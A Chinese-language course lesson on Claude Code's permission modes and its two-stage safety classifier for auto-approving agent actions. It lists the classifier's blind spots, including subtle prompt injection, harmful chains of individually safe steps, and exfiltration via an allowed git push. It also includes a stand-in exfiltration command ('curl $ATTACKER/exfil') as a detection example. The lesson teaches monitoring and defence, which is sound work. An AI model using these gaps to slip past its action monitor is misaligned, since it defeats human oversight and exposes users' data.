# Claude Code 作为自主智能体：权限模式与自动模式

> Claude Code 暴露了七种权限模式。"plan"在每个操作前询问，"default"只询问有风险的操作，"acceptEdits"自动批准文件写入但仍确认 shell 执行，"bypassPermissions"批准一切。自动模式（2026 年 3 月 24 日）用两阶段并行安全分类器取代逐操作批准：单 token 快速检查在每个操作上运行；标记的操作触发链式思维深度审查。操作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。自动模式作为研究预览发布——Anthropic 明确表示分类器本身并不足够。

**类型：** Learn
**语言：** Python（标准库，两阶段分类器模拟器）
**前置要求：** Phase 15 · 01（长时域智能体），Phase 15 · 09（编码智能体图景）
**时间：** 约 45 分钟

## 问题

你机器上的自主编码智能体是一个独特的安全类别。攻击面是智能体可以触及的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人公开指出了这一点：计算机使用智能体不是聊天机器人的"功能更新"，它们是一种新型工具，具有新型风险特征。

Claude Code 的权限系统是 Anthropic 的答案。不是单一的"自主/不自主"开关，而是七种模式跨越能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式是速度与逐操作审查之间不同的权衡。自动模式（2026 年 3 月）添加了两阶段分类器，将分类器判断安全的操作批准移出用户的关键路径，同时保留分类器标记的操作的审查层。

工程问题：该系统捕获什么，遗漏什么，给定任务实际需要哪种模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|---|---|---|
| `plan` | 智能体提出计划；用户在执行前批准整个计划；每个操作在执行前都经过审查 | 不熟悉的任务；生产相关代码；首次在该仓库上使用智能体 |
| `default` | 智能体运行操作；对任何"有风险"操作（shell 执行、破坏性操作、网络调用）提示用户 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍然提示 | 跨多个文件的重构通过 |
| `acceptExec` | Shell 命令在精心策划的允许列表内自动批准；写入自动批准 | 紧密内部循环，其中每个 shell 命令是 `npm test` 或类似 |
| `autoMode` | 两阶段安全分类器；标记的操作升级到审查 | 在约束工作空间中长时域无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具允许列表/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档说明仅用于"你愿意丢弃的临时容器" |

（以上名称与公开 Claude Code 文档匹配；"yolo"是对宽松中间地带的非正式简写。）

### 自动模式一页通览

自动模式（2026 年 3 月 24 日发布）是第一个将逐操作批准委托给模型的权利模式。结构：

1. **阶段 1——单 token 分类器。** 在每个提议的操作上运行。廉价。返回"安全"或"标记"。设计为与主智能体循环并行运行，因此批准的操作不会在队列中等待。
2. **阶段 2——辅助策略/安全审查。** 仅在标记的操作上运行。对操作、会话当前状态和声明的任务进行重点策略和安全评估。如果置信度低，则升级到用户 HITL。

预算控制与分类器并列：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 美元上限，超出则中止会话。
- 每个工具的操作计数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统捕获的内容

- 将注入的指令映射到已知风险操作形状的提示注入到工具输入中。
- 重复工具循环——分类器可以看到操作 N+1 与操作 N 几乎相同，连续五次。
- 在否则仅文件编辑的会话上明显超出范围外的 shell 命令。

### 系统可能遗漏的内容

- **微妙的提示注入**，在不产生单个标记操作的情况下调节行为。间接提示注入不是可以完全修补的漏洞（2025 年 OpenAI 准备负责人，关于浏览器智能体——见第 11 课）。
- **语义级错误行为。** 每个单独的操作可能看起来安全，而组合轨迹是有害的。分类器判断操作；它不会重新推导用户的意图。
- **通过合法渠道进行渗透。** 写入你拥有的文件，然后 `git push` 到公共仓库，是一系列允许的操作，其组合是问题。

### 研究预览框架

Anthropic 将自动模式作为研究预览发布。文档明确表示分类器是一层，而非解决方案：用户被期望将自动模式与预算、允许列表、隔离工作空间和轨迹审计（第 12-16 课）结合使用。预览框架也反映了文档化的评估与部署差距（第 1 课）——在离线评估中通过的分类器，在真实会话中可能表现不同，因为用户的上下文是模糊的。

### 这个阶梯在你的工作流中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚糟糕运行便宜。
- 已知重构：`acceptEdits` 节省大量确认点击。
- 无人值守后台运行：只有在爆炸半径已测量的工作空间中才使用 `autoMode`（无凭证、无生产挂载、无未选择出口）。
- 临时容器：如果容器及其凭证是可丢弃的，则可以接受 `yolo` / `bypassPermissions`。

## 使用它

`code/main.py` 模拟两阶段分类器。阶段 1 是对提议操作的廉价关键词规则；阶段 2 是较慢的多规则审查器。驱动输入一个简短的合成轨迹（安全操作、提示注入尝试、重复循环），并显示分类器捕获和遗漏的位置。

## 交付它

`outputs/skill-permission-mode-picker.md` 将任务描述与正确的权限模式、预算上限和所需隔离相匹配。

## 练习

1. 运行 `code/main.py`。哪种合成操作类型阶段 1 从不标记但阶段 2 总是捕获？哪种两者都不捕获？

2. 扩展阶段 1 规则集以捕获特定已知不良形状（例如 `curl $ATTACKER/exfil`）。测量良性操作样本上的误报率。

3. 阅读 Anthropic 的"智能体循环如何工作"文档。列出默认情况下 `default` 模式下智能体触及的每个外部状态。在无人值守运行 `autoMode` 之前，你需要单独隔离哪个？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每个工具上限、允许列表。为每个数字提供理由。

5. 描述一个轨迹，其中每个单独的操作都得到阶段 1 和阶段 2 的批准，但组合行为是不对齐的。（第 14 课涵盖了 kill 开关和金丝雀 token 如何解决这个问题。）

## 关键术语

| 术语 | 人们的说法 | 实际含义 |
|---|---|---|
| 权限模式 | "智能体能做多少" | 控制逐操作批准的七种命名策略之一 |
| plan 模式 | "任何操作前询问" | 智能体编写计划；用户在执行前批准 |
| acceptEdits | "让它写入文件" | 文件写入自动批准；shell 执行仍然提示 |
| autoMode | "自动批准" | 两阶段安全分类器；标记的操作升级 |
| bypassPermissions | "完全 YOLO" | 批准一切；适用于临时容器 |
| 阶段 1 分类器 | "快速 token 检查" | 对提议操作的单 token 规则；并行运行 |
| 阶段 2 分类器 | "深度审查" | 对标记操作的链式思维推理 |
| 研究预览 | "非 GA" | Anthropic 对仍在映射失败模式的功能的框架 |
